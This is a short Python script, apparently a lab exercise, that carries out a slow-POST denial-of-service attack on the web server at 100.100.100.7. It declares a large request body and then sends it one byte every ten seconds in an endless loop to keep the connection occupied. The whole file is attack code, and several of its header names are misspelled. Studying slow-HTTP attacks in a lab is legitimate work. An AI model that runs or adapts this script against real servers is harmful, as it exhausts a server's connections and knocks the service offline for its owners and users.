import socket
import struct
import time

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(('100.100.100.7',80))

request = "POST / HTTP/1.1\r\n"  		#start-line
request += "HOST: 100.100.100.7\r\n"		#header-Filed
request += "Content Type: test/html\r\n"	#data type
request += "Content Length: 99999\r\n"		#date length: 9999만큼의 데이터를 보내겠다
request += "\r\n"				#End
request += "A"					#DATA BODY


response = ''

sock.send(request.encode())
while True:
	sock.send("A".encode())
	response = sock.recv(65535)
	time.sleep(10)


